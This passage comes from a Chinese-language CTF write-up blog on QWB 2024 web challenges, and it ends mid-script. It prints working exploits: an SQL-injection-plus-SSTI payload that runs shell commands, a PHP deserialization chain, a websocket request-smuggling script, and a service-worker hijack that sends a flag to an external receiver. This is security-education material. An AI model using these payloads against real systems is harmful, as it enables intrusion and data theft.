-<span class="number">1</span>, dist)]</span><br><span class="line">    heads = [head]</span><br><span class="line">    QUE.queue.clear()</span><br><span class="line"></span><br><span class="line">    QUE.put((dist, dcp(snake), <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span> QUE.empty():</span><br><span class="line">        temp = QUE.get()</span><br><span class="line">        <span class="comment">## print(temp)</span></span><br><span class="line">        dist, snake, pth = temp</span><br><span class="line">        head = snake[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> head[<span class="number">0</span>] == food[<span class="number">0</span>] <span class="keyword">and</span> head[<span class="number">1</span>] == food[<span class="number">1</span>]:</span><br><span class="line">            <span class="keyword">while</span> pth != <span class="number">0</span>:</span><br><span class="line">                pth, p, dist = path[pth]</span><br><span class="line">                <span class="comment">## print(heads[pth], direc[p])</span></span><br><span class="line">            <span class="keyword">return</span> direc[p]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> x, y, p <span class="keyword">in</span> FourDirec(head[<span class="number">0</span>], head[<span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= x &lt; size <span class="keyword">and</span> <span class="number">0</span> &lt;= y &lt; size <span class="keyword">and</span> [x, y] <span class="keyword">not</span> <span class="keyword">in</span> snake:</span><br><span class="line">                newsnake = [[x, y]] + dcp(snake)[:-<span class="number">1</span>]</span><br><span class="line">                dist = <span class="built_in">abs</span>(x - food[<span class="number">0</span>]) + <span class="built_in">abs</span>(y - food[<span class="number">1</span>])</span><br><span class="line">                path.append((pth, p, dist))</span><br><span class="line">                heads.append([x, y])</span><br><span class="line">                QUE.put((dist, dcp(newsnake), <span class="built_in">len</span>(path) - <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">draw</span>(<span class="params">snake, food</span>):</span><br><span class="line">    board = np.zeros((size, size), dtype=<span class="built_in">int</span>)</span><br><span class="line">    board[food[<span class="number">0</span>], food[<span class="number">1</span>]] = <span class="number">2</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> snake:</span><br><span class="line">        board[i[<span class="number">0</span>], i[<span class="number">1</span>]] = <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(board)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Login_Start(<span class="string">&quot;test&quot;</span>)</span><br><span class="line">    food, snake, sc = sendmove(<span class="string">&quot;RIGHT&quot;</span>)</span><br><span class="line">    <span class="comment">## print(food, snake)</span></span><br><span class="line">    <span class="comment">## draw(snake, food)</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        dire = find_path(food, snake)</span><br><span class="line">        <span class="built_in">print</span>(sc, dire, food, snake)</span><br><span class="line">        food, snake, sc = sendmove(dire)</span><br><span class="line">        draw(snake, food)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>长度到50给路由，然后是sqli+ssti。</p><figure class="highlight python"><figcaption><span>title:payload</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/snake_win?username=<span class="number">1</span><span class="string">&#x27; union select 1,2,&quot;&#123;&#123;[].__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;</span>popen<span class="string">&#x27;](&#x27;</span>cat /f*<span class="string">&#x27;).read()&#125;&#125;&quot; --+</span></span><br></pre></td></tr></table></figure><h2 id="password-game"><a href="#password-game" class="headerlink" title="password_game"></a>password_game</h2><p>前面的计算脚本编写很简单，但构造链子卡了我很久，果然是用的引用&#x3D; &#x3D;。</p><h3 id="环境搭建-4"><a href="#环境搭建-4" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name password_game -p 8080:80 sketchpl4ne/qwb2024:password_game_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p><strong>思路</strong>：首先是下面的逻辑，经过测试可以发现是永真的，<code>$this-&gt;username</code>可以任意传递并输出，<code>filter()</code>是失效的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">// this code have bugs that expression always be true even string does not match.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来问题是如何输出flag，下面的代码中flag被赋值到<code>$this-&gt;value</code>，将<code>this-&gt;username</code>设置为value的引用即可，<code>$this-&gt;value == &quot;2024qwb&quot;</code>可以轻松绕过使用字符串弱类型比较。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;in&quot;</span>;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>__destruct()</code>会自动触发，<code>__get()</code>通过<code>... &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)</code>将password设置成root触发。</p><p>最终exp如下：</p><figure class="highlight php"><figcaption><span>title:exp.php</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>] = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span>();  <span class="comment">// 这里不是$this-&gt;value，傻鸟出题人故意的</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;in&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">// this code have bugs that if expression always be true even string does not match.</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> user;</span><br><span class="line"><span class="variable">$r</span> = <span class="keyword">new</span> root;</span><br><span class="line"><span class="variable">$r</span>-&gt;username = <span class="variable">$u</span>;</span><br><span class="line"><span class="variable">$r</span>-&gt;value = <span class="number">2024</span>;</span><br><span class="line"><span class="variable">$u</span>-&gt;username = &amp;<span class="variable">$r</span>-&gt;value;</span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$r</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">urlencode</span>(<span class="variable">$s</span>));</span><br><span class="line"><span class="comment">// print_r(filter($s).&quot;\n&quot;);</span></span><br><span class="line"><span class="comment">// $user=unserialize(filter($s));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if(strpos($user-&gt;username, &quot;admin&quot;) == 0 &amp;&amp; $user-&gt;password == &quot;2024qwb&quot;)&#123;</span></span><br><span class="line"><span class="comment">//     echo &quot;hello!&quot;;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><h3 id="环境搭建-5"><a href="#环境搭建-5" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name proxy -p 5870:8000 sketchpl4ne/qwb2024:proxy_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>这题应该是出的有问题，用v2代理去访问v1的flag路由就行了，没有什么限制。</p><figure class="highlight python"><figcaption><span>title:"exp.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## --coding: utf-8 --</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://localhost:5870/v2/api/proxy&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line">  <span class="string">&quot;url&quot;</span>: <span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,</span><br><span class="line">  <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(url=url,json=data, headers=headers)</span><br><span class="line">flag = json.loads(res.text)[<span class="string">&#x27;flag&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(flag).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure><h2 id="proxy-revenge"><a href="#proxy-revenge" class="headerlink" title="proxy_revenge"></a>proxy_revenge</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --name proxy_revenge -p 5870:8000 sketchpl4ne/qwb2024:proxy_revenge_img</span><br></pre></td></tr></table></figure><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>使用到<code>websocket-summgle</code> ，由于<code>proxy.conf</code>里v2的代理设置有问题，对于header的Upgrade直接转发不做任何限制，符合<a href="https://github.com/0ang3el/websocket-smuggle">websocket-summgle</a> 里的<code>Scenario 2 nginx smuggle</code>。</p><figure class="highlight plaintext"><figcaption><span>title:"proxy.conf"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 8000;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 &#123;</span><br><span class="line">        return 403;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /v2 &#123;</span><br><span class="line">        proxy_pass http://localhost:8769;</span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Host $host;</span><br><span class="line">        proxy_set_header X-Real-IP $remote_addr;</span><br><span class="line">        proxy_set_header Upgrade $http_upgrade;</span><br><span class="line">        proxy_set_header Connection $connection_upgrade;</span><br><span class="line">        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞原理：简单来说，如果client在Header里设置Upgrade、Sec-WebSocket-Accept等参数发起http请求，并且backend返回HTTP 状态码101的话，那么就可借由反代服务器实现一个<code>client &lt;=&gt; backend</code>的socket连接。后续通过这个socket连接可以绕过中间件的acl waf，从而访问原本受限的路由。</p><p>感谢L3H大碟的WP： <a href="https://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/">https://blog.yllhwa.com/qwb-2024-proxy-revenge-wp/</a><br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/9de86b2db7268e5f245d7ff5c6866de2.png"></p><p>所以先起一个永远 return 101 http status code  的 server</p><figure class="highlight python"><figcaption><span>title:"server.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> http.server</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SimpleHTTPRequestHandler</span>(http.server.BaseHTTPRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        self.send_response(<span class="number">101</span>)</span><br><span class="line">        self.send_header(<span class="string">&#x27;Content-type&#x27;</span>, <span class="string">&#x27;text/html&#x27;</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b&#x27;HTTP Status 101 - Switching Protocols&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## Set up the server to listen on localhost and port 5000</span></span><br><span class="line">server_address = (<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">5000</span>)</span><br><span class="line">httpd = http.server.HTTPServer(server_address, SimpleHTTPRequestHandler)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Server running on http://0.0.0.0:5000/&quot;</span>)</span><br><span class="line">httpd.serve_forever()</span><br></pre></td></tr></table></figure><p>然后请求走私打一发payload即可（这里尝试发现并不需要绕加密，思路可以参考<code>yllhwa</code>师傅的WP）</p><figure class="highlight python"><figcaption><span>title:"smuggle.py"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;http://localhost:5870&quot;</span></span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">5870</span>))</span><br><span class="line"><span class="comment">## Here is a attacker server that u need to build which always response http status &quot;101&quot;</span></span><br><span class="line">content = <span class="string">&#x27;&#123;&quot;url&quot;: &quot;http://192.168.0.191:5000&quot;, &quot;method&quot;: &quot;GET&quot;&#125;&#x27;</span></span><br><span class="line">payload = <span class="string">f&quot;&quot;&quot;POST /v2/api/proxy HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:5870</span></span><br><span class="line"><span class="string">Upgrade: websocket</span></span><br><span class="line"><span class="string">Connection: Upgrade</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;content&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s.send(payload.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br><span class="line">payload = <span class="string">f&quot;&quot;&quot;POST /v1/api/flag HTTP/1.1</span></span><br><span class="line"><span class="string">Host: localhost:5870</span></span><br><span class="line"><span class="string">Content-Length: <span class="subst">&#123;<span class="built_in">len</span>(content)&#125;</span></span></span><br><span class="line"><span class="string">Content-Type: application/json</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"><span class="subst">&#123;content&#125;</span></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">s.send(payload.encode())</span><br><span class="line"><span class="built_in">print</span>(s.recv(<span class="number">1024</span>))</span><br></pre></td></tr></table></figure><h2 id="ezcalc"><a href="#ezcalc" class="headerlink" title="ezcalc"></a>ezcalc</h2><h3 id="环境搭建-7"><a href="#环境搭建-7" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>这题需要安装SSL证书实现https访问，本地起环境没用，下面是微调了的dockerfile</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://pan.baidu.com/s/1rVf7OrdUdO6WrbFiaUlxsg?pwd=xmxm 提取码: xmxm</span><br></pre></td></tr></table></figure><p>买了1个月的服务器，起个远程环境方便复现，希望别搅屎（）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ezcalc.jaspersec.us.kg/</span><br></pre></td></tr></table></figure><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>服务逻辑：两个服务，app可以计算用户输入的算数表达式，也可以提交report反馈可能计算错误的结果。用户提交的report (包含算术表达式) 会发送给bot，然后bot起一个浏览器访问app服务并重新计算结果，对用户的反馈进行验证。</p><p>在bot的逻辑里注意到如果提交的表达式为 <code>114514</code>，bot会读取flag作为expr，输入app作为表达式计算。<br><img src="https://raw.githubusercontent.com/sketchpl4ne/images/main/imgs/7d7359b03c73056c6838fb3103bb427e.png"></p><p>光这样显然没用，因为flag不会回显，问题是怎么回显flag，看了W&amp;M的writeup，后续是通过打math.js的cve实现js代码执行，然后用service worker去劫持页面，bot点击按钮时触发js代码外带出flag。</p><p>具体方式可以参考下方wp，JS研究没那么深：</p><ul><li><a href="https://blog.wm-team.cn/index.php/archives/85/#EzCalc">https://blog.wm-team.cn/index.php/archives/85/#EzCalc</a></li><li><a href="https://lorexxar.cn/2018/04/20/SW-xss/">https://lorexxar.cn/2018/04/20/SW-xss/</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API">https://developer.mozilla.org/en-US/docs/Web/API/Service_Worker_API</a></li></ul><p>exp如下：</p><figure class="highlight python"><figcaption><span>title:exp.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</span><br><span class="line"></span><br><span class="line">RECEIVER=<span class="string">&#x27;http://xxx.xxx.xxx.xxx:xxx&#x27;</span></span><br><span class="line"></span><br><span class="line">TARGET=<span class="string">&#x27;https://ezcalc.jaspersec.us.kg/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_file</span>(<span class="params">content</span>):</span><br><span class="line">    bio = BytesIO()</span><br><span class="line">    bio.write(content.encode())</span><br><span class="line">    r = requests.post(TARGET + <span class="string">&#x27;/api/screenshot/upload&#x27;</span>, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;a.js&#x27;</span>, bio.getvalue(), <span class="string">&#x27;image/png&#x27;</span>)&#125;)</span><br><span class="line">    <span class="keyword">return</span> r.json()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_payload</span>(<span class="params">script</span>):</span><br><span class="line">    payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    e=parse(&quot;constructor(&#x27;d=()=&gt;document.querySelector(`.ant-alert-message`);setInterval(()=&gt;&#123;if(d())d().innerHTML=114514&#125;,100);%s&#x27;)&quot;)._compile(&#123;&#125;,&#123;&#125;);f=e(null,cos);f()</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span>.replace(<span class="string">&#x27;%s&#x27;</span>, script).strip()</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">service_worker_html = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">GIF89a=1;</span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;install&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  self.skipWaiting();</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">self.addEventListener(&#x27;activate&#x27;, event =&gt; &#123;</span></span><br><span class="line"><span class="string">  event.waitUntil(self.clients.claim());</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string"></span></span><br><span 